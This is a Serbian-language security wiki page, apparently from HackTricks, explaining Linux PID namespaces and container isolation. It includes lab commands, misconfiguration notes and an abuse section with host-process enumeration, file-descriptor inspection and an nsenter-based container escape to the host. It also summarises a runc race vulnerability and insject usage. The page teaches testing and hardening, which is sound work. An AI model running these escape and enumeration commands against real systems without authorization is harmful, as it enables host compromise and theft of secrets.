# PID Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Pregled

PID namespace kontroliše način numerisanja procesa i procese koji su vidljivi. Zbog toga container može imati sopstveni PID 1 iako nije stvarna mašina. Unutar namespace-a, workload vidi ono što izgleda kao lokalno stablo procesa. Izvan namespace-a, host i dalje vidi stvarne host PID-ove i celokupno okruženje procesa.

Sa stanovišta bezbednosti, PID namespace je važan zato što je vidljivost procesa vredna. Kada workload može da vidi host procese, možda može da posmatra nazive servisa, argumente komandne linije, secrets prosleđene u argumentima procesa, stanje izvedeno iz environment-a kroz `/proc` i potencijalne mete za ulazak u namespace. Ako može da uradi više od samog posmatranja tih procesa, na primer da šalje signale ili koristi ptrace pod odgovarajućim uslovima, problem postaje mnogo ozbiljniji.

## Rad

Novi PID namespace počinje sa sopstvenim internim numerisanjem procesa. Prvi proces kreiran unutar njega postaje PID 1 iz perspektive tog namespace-a, što takođe znači da dobija posebnu init-like semantiku za orphaned child procese i ponašanje signala. Ovo objašnjava mnoge neobičnosti container-a u vezi sa init procesima, prikupljanjem zombie procesa i razlogom zbog kog se mali init wrapper-i ponekad koriste u container-ima.

Važna bezbednosna pouka jeste da proces može izgledati izolovano zato što vidi samo sopstveno PID stablo, ali ta izolacija može biti namerno uklonjena. Docker ovo izlaže kroz `--pid=host`, dok Kubernetes to radi pomoću `hostPID: true`. Kada se container pridruži host PID namespace-u, workload direktno vidi host procese, a mnogi kasniji attack path-ovi postaju mnogo realniji.

## Laboratorija

Da biste ručno kreirali PID namespace:
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
Shell sada vidi privatni prikaz procesa. Flag `--mount-proc` je važan zato što montira procfs instancu koja odgovara novom PID namespace-u, čineći listu procesa koherentnom iznutra.

Za poređenje ponašanja kontejnera:
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
Razlika je neposredna i lako razumljiva, zbog čega je ovo dobar prvi lab za čitaoce.

## Upotreba runtime-a

Normalni container-i u Docker-u, Podman-u, containerd-u i CRI-O-u dobijaju sopstveni PID namespace. Kubernetes Pod-ovi obično takođe dobijaju izolovani prikaz PID-ova, osim ako workload izričito zatraži deljenje host PID namespace-a. LXC/Incus okruženja oslanjaju se na isti kernel primitive, mada slučajevi upotrebe system-container-a mogu izložiti složenija stabla procesa i podstaknuti korišćenje više prečica za debugging.

Isto pravilo važi svuda: ako runtime odluči da ne izoluje PID namespace, to predstavlja namerno slabljenje container granice.

## Pogrešne konfiguracije

Tipična pogrešna konfiguracija je deljenje host PID namespace-a. Timovi to često opravdavaju praktičnošću za debugging, monitoring ili upravljanje servisima, ali to uvek treba posmatrati kao značajan security izuzetak. Čak i ako container nema neposredan write primitive nad host procesima, sama vidljivost može otkriti mnogo informacija o sistemu. Kada se dodaju capabilities kao što su `CAP_SYS_PTRACE` ili koristan procfs pristup, rizik se značajno povećava.

Druga greška je pretpostavka da je deljenje host PID namespace-a bezopasno zato što workload podrazumevano ne može da ubije host procese niti da nad njima koristi ptrace. Takav zaključak zanemaruje vrednost enumeration-a, dostupnost meta za ulazak u namespace i način na koji se vidljivost PID-ova kombinuje sa drugim oslabljenim kontrolama.

## Zloupotreba

Ako se host PID namespace deli, attacker može da pregleda host procese, prikupi argumente procesa, identifikuje zanimljive servise, pronađe potencijalne PID-ove za `nsenter` ili kombinuje vidljivost procesa sa privilegijama povezanim sa ptrace-om kako bi ometao host ili susedne workload-e. U nekim slučajevima, samo uočavanje odgovarajućeg dugotrajno pokrenutog procesa dovoljno je da promeni ostatak plana napada.

Prvi praktični korak je uvek potvrda da su host procesi zaista vidljivi:
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
Kada PID-ovi hosta postanu vidljivi, argumenti procesa i ciljevi za ulazak u namespace često postaju najkorisniji izvor informacija:
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
Ako je `nsenter` dostupan i postoje dovoljne privilegije, testirajte da li vidljivi proces hosta može da se koristi kao most između namespace-ova:
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
Čak i kada je ulazak blokiran, deljenje host PID prostora je već korisno jer otkriva raspored servisa, komponente runtime okruženja i potencijalne privilegovane procese koji se mogu sledeći napasti.

Vidljivost host PID procesa takođe čini zloupotrebu deskriptora datoteka realnijom. Ako privilegovani host proces ili susedno radno opterećenje ima otvorenu osetljivu datoteku ili socket, napadač možda može da pregleda `/proc/<pid>/fd/` i ponovo upotrebi taj deskriptor, u zavisnosti od vlasništva, opcija montiranja procfs sistema datoteka i modela ciljnog servisa.
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
Ove komande su korisne jer pokazuju da li `hidepid=1` ili `hidepid=2` smanjuje vidljivost između procesa i da li su očigledno zanimljivi deskriptori, kao što su otvoreni tajni fajlovi, logovi ili Unix socketi, uopšte vidljivi.

### Potpun primer: host PID + `nsenter`

Deljenje host PID prostora postaje direktan izlaz sa hosta kada proces ima i dovoljno privilegija da se pridruži namespace-ovima hosta:
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Ako komanda uspe, proces kontejnera se sada izvršava u host mount, UTS, network, IPC i PID namespaces. Posledice su trenutna kompromitacija hosta.

Čak i kada sam `nsenter` nedostaje, isti rezultat se može postići putem host binary-ja ako je host filesystem montiran:
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### Nedavne napomene o runtime-u

Neki napadi relevantni za PID namespace nisu tradicionalne pogrešne konfiguracije poput `hostPID: true`, već greške u implementaciji runtime-a povezane s načinom na koji se procfs zaštite primenjuju tokom podešavanja containera.

#### `maskedPaths` race do host procfs-a

U ranjivim verzijama alata `runc`, napadači koji mogu da kontrolišu container image ili workload pokrenut pomoću `runc exec` mogli su da iskoriste race tokom faze maskiranja tako što bi zamenili `/dev/null` na strani containera symlinkom ka osetljivoj procfs putanji, kao što je `/proc/sys/kernel/core_pattern`. Ako bi race uspeo, bind mount za maskiranu putanju mogao bi da završi na pogrešnoj meti i izloži procfs parametre globalne za host novom containeru.<sup>[[1]](#references)</sup>

Korisna komanda za proveru:
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
Ovo je važno zato što krajnji uticaj može biti isti kao kod direktnog izlaganja procfs-a: upisiv `core_pattern` ili `sysrq-trigger`, nakon čega sledi izvršavanje koda na hostu ili denial of service.

#### Namespace injection sa `insject`

Alati za Namespace injection, kao što je `insject`, pokazuju da interakcija sa PID namespace-om ne zahteva uvek prethodni ulazak u ciljni namespace pre kreiranja procesa. Pomoćni program može da se prikači naknadno, koristi `setns()` i izvršava se uz očuvanje vidljivosti u ciljnom PID prostoru:<sup>[[2]](#references)</sup>
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
Ova vrsta tehnike je najvažnija za napredno debugging okruženje, offensive tooling i post-exploitation workflow-e u kojima namespace context mora da se pridruži nakon što je runtime već inicijalizovao workload.

### Povezani obrasci zloupotrebe FD-a

Dva obrasca vredi izričito istaći kada su host PID-ovi vidljivi. Prvo, privileged process može da zadrži osetljivi file descriptor otvoren tokom `execve()` zato što nije označen sa `O_CLOEXEC`. Drugo, servisi mogu da prosleđuju file descriptor-e preko Unix socket-a koristeći `SCM_RIGHTS`. U oba slučaja zanimljiv objekat više nije pathname, već već otvoreni handle koji process sa nižim privilegijama može da nasledi ili primi.

Ovo je važno u radu sa container-ima zato što handle može da pokazuje na `docker.sock`, privileged log, host secret file ili drugi high-value objekat, čak i kada sam path nije direktno dostupan iz container filesystem-a.

## Provere

Svrha ovih komandi je da utvrde da li process ima privatni PID view ili već može da enumeriše znatno širi process landscape.
```bash
readlink /proc/self/ns/pid   # PID namespace identifier
ps -ef | head                # Quick process list sample
ls /proc | head              # Process IDs and procfs layout
```
Šta je ovde zanimljivo:

- Ako lista procesa sadrži očigledne host servise, deljenje host PID-ova je verovatno već aktivno.
- Videti samo malo stablo lokalno za container predstavlja uobičajenu osnovu; videti `systemd`, `dockerd` ili nepovezane daemon-e nije.
- Kada host PID-ovi postanu vidljivi, čak i informacije o procesima dostupne samo za čitanje postaju korisne za izviđanje.

Ako otkrijete container koji radi uz deljenje host PID-ova, nemojte to tretirati kao kozmetičku razliku. To je velika promena u onome što workload može da posmatra i potencijalno na šta može da utiče.

## Reference

- [1] [runc security advisory: bekstvo iz containera putem zloupotrebe „masked path“ usled race uslova pri mount-u (CVE-2025-31133)](https://github.com/opencontainers/runc/security/advisories/GHSA-9493-h29p-rfm2)
- [2] [Objava alata – insject: Linux Namespace Injector](https://www.nccgroup.com/research-blog/tool-release-insject-a-linux-namespace-injector/)

{{#include ../../../../../banners/hacktricks-training.md}}
